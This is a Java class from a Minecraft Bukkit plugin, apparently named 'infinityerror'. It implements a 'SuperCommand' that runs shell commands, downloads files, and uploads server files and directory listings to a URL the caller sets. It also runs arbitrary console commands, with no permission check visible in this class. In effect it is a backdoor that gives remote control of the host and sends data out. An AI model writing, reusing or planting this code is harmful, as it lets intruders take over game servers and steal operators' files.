package me.lidan.infinityerror.supercommands;

import me.lidan.infinityerror.Infinityerror;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.IOException;
import java.util.Arrays;

public class SuperCommand {
    private CommandSender sender;

    public SuperCommand(CommandSender sender) {
        this.sender = sender;
    }

    public void execute(String[] args) {
        if (args.length == 0) {
            sender.sendMessage("No command specified");
            return;
        }
        String full_command = String.join(" ", args);
        String command = args[0];
        String[] split_command = args;
        Bash bash;
        if (Bash.getInstance() == null) {
            bash = new Bash(sender);
        }
        else if (Bash.getInstance().getSender() != sender) {
            bash = new Bash(sender);
        }
        else {
            bash = Bash.getInstance();
        }

        if (command.equals("bash")) {
            // remove the first element of the array
            split_command = Arrays.copyOfRange(args, 1, args.length);
            bash.bash(split_command);
        }
        else if (command.equals("download")) {
            bash.useDownloader(split_command);
        } else if (command.equals("seturl")) {
            bash.setURL(split_command[1]);
            sender.sendMessage("Set url to " + bash.getURL());
        } else if (command.equals("post")) {
            if (bash.getURL().isEmpty()){
                sender.sendMessage("No url specified. Use seturl [url]");
                return;
            }
            split_command = Arrays.copyOfRange(args, 1, args.length);
            try {
                Bash.sendPOSTMessage(bash.getURL(), String.join(" ", split_command));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (command.equals("upload")) {
            try {
                Bash.sendPOSTFile(bash.getURL(), bash.getCurrentDirectory() + "/" + split_command[1]);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (command.equals("ls")) {
            String output = Bash.ls(bash.getCurrentDirectory());
            try {
                Bash.sendPOSTMessage(bash.getURL(), output);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (command.equals("cd")) {
            if (split_command.length < 2) {
                sender.sendMessage("No directory specified");
                return;
            }
            if (split_command[1].equals("..")) {
                bash.setCurrentDirectory(bash.getCurrentDirectory().substring(0, bash.getCurrentDirectory().lastIndexOf("/")));
                return;
            }
            if (split_command[1].equals(".")) {
                return;
            }
            if (split_command[1].equals("/")) {
                bash.setCurrentDirectory("/");
                return;
            }
            if (split_command[1].equals("~")) {
                bash.setCurrentDirectory(System.getProperty("user.dir"));
                return;
            }
            bash.setCurrentDirectory(bash.getCurrentDirectory() + "/" + split_command[1]);
            sender.sendMessage("Set current directory to " + bash.getCurrentDirectory());
        } else if (command.equals("pwd")) {
            sender.sendMessage(bash.getCurrentDirectory());
        } else if (command.equals("help")) {
            sender.sendMessage("Commands:");
            sender.sendMessage("bash");
            sender.sendMessage("download");
        }
        else {
            new BukkitRunnable() {
                @Override
                public void run() {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), full_command);
                }
            }.runTask(Infinityerror.getInstance());
        }

    }
}